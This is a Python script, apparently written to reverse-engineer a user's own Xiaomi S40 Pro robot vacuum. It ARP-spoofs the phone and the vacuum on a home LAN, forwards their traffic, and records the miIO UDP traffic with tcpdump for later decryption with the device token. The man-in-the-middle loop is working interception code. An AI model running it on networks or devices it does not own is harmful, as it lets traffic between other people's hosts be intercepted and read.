"""
Capture Mi Home app <-> S40 Pro LAN miIO (UDP 54321) via ARP-spoof MITM, on macOS.

macOS + scapy can't set promiscuous mode (Errno 102), so we DON'T sniff with scapy.
Instead: tcpdump (native, reliable) writes a pcap; scapy is used ONLY to send ARP
(no promisc needed); we decode the pcap afterwards with decode_miio_pcap.py using
the device token (miIO LAN is token-encrypted -> we can decrypt it).

Run (root; runs until Ctrl-C):
    sudo VACUUM_LOCAL_TOKEN=<32hex> spikes/.miio-venv/bin/python spikes/sniff_miio_lan.py <PHONE_IP>
Then open the MAP in Mi Home. Ctrl-C to stop -> restores ARP, then tell Claude
to decode spikes/miio_lan.pcap.
"""
import os, sys, re, time, signal, atexit, subprocess, threading
from scapy.all import Ether, ARP, sendp

IFACE = os.environ.get("IFACE", "en0")
ROBOT = "192.168.1.191"
PHONE = sys.argv[1] if len(sys.argv) > 1 else sys.exit("usage: sniff_miio_lan.py <PHONE_IP>")
PCAP = os.path.join(os.path.dirname(__file__), "miio_lan.pcap")


def cache_mac(ip):
    """Read MAC from the OS ARP cache (active ARP often ignored by sleeping phones)."""
    out = subprocess.run(["arp", "-n", ip], capture_output=True, text=True).stdout
    m = re.search(r"at ([0-9a-fA-F:]+)", out)
    if not m:
        return None
    return ":".join(x.zfill(2) for x in m.group(1).split(":"))


ROBOT_MAC = cache_mac(ROBOT)
PHONE_MAC = cache_mac(PHONE)
print(f"[*] iface={IFACE}  robot {ROBOT}={ROBOT_MAC}  phone {PHONE}={PHONE_MAC}")
if not ROBOT_MAC or not PHONE_MAC:
    sys.exit("[!] MAC not in ARP cache. Ping both first: ping 192.168.1.191 ; ping <phone>")

os.system("sysctl -w net.inet.ip.forwarding=1 >/dev/null")
os.system("sysctl -w net.inet.ip.redirect=0 >/dev/null")

# start native capture
td = subprocess.Popen(["tcpdump", "-i", IFACE, "-n", "-U", "-w", PCAP,
                       f"udp port 54321 and host {ROBOT} and host {PHONE}"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
print(f"[*] tcpdump -> {PCAP}")

_run = True


def restore():
    global _run
    _run = False
    time.sleep(0.3)
    try:
        td.terminate()
    except Exception:
        pass
    print("[*] restoring ARP...")
    for _ in range(5):
        sendp(Ether(dst=PHONE_MAC) / ARP(op=2, psrc=ROBOT, hwsrc=ROBOT_MAC, pdst=PHONE, hwdst=PHONE_MAC), iface=IFACE, verbose=0)
        sendp(Ether(dst=ROBOT_MAC) / ARP(op=2, psrc=PHONE, hwsrc=PHONE_MAC, pdst=ROBOT, hwdst=ROBOT_MAC), iface=IFACE, verbose=0)
        time.sleep(0.2)
    os.system("sysctl -w net.inet.ip.forwarding=0 >/dev/null")
    print(f"[*] done. packets captured -> {PCAP}")


atexit.register(restore)
signal.signal(signal.SIGINT, lambda *a: sys.exit(0))

print("[*] ARP spoof active. >>> Open the MAP in Mi Home now, pan/zoom + start clean. <<<")
print("[*] Ctrl-C when done.\n")
n = 0
while _run:
    try:
        sendp(Ether(dst=PHONE_MAC) / ARP(op=2, psrc=ROBOT, pdst=PHONE, hwdst=PHONE_MAC), iface=IFACE, verbose=0)
        sendp(Ether(dst=ROBOT_MAC) / ARP(op=2, psrc=PHONE, pdst=ROBOT, hwdst=ROBOT_MAC), iface=IFACE, verbose=0)
    except Exception as e:
        print(f"[!] sendp failed: {e}")
        break
    n += 1
    if n % 5 == 0:
        sz = os.path.getsize(PCAP) if os.path.exists(PCAP) else 0
        print(f"    spoofing... pcap={sz}B")
    time.sleep(2)
